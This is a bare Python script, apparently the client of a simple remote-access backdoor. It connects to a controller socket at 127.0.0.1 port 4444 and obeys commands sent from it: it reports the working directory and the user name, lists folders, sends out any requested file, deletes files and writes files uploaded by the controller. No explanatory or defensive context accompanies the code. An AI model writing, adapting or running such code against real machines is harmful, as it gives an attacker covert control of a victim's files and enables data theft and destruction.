import os, socket, getpass
host = "127.0.0.1"
port = 4444
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
while True:
    i = s.recv(1024)
    i = i.decode() 
    if i == "getcwd":
      files = os.getcwd()
      files = str(files)
      s.send(files.encode())
    elif i == "listdir":
        u = s.recv(5000)
        u = u.decode()
        files = os.listdir(u)
        files = str(files)
        s.send(files.encode())
    elif i == "download":
        u = s.recv(5000)
        u = u.decode()
        file = open(u, "rb") 
        data = file.read()
        s.send(data)
    elif i == "delete":
        u = s.recv(6000)
        u = u.decode()
        os.remove(u)
    elif i == "send":
        filename = s.recv(6000)
        new_file = open(filename, "wb")
        data = s.recv(6000)
        new_file.write(data)
        new_file.close()
    elif i == "who":
      files = getpass.getuser()
      files = str(files)
      s.send(files.encode())
    elif i == "init":
        p = s.recv(5000)
        p = p.decode()
        files = open(p)
        files = str(files)
        s.send(files.encode())
    else:
        print()
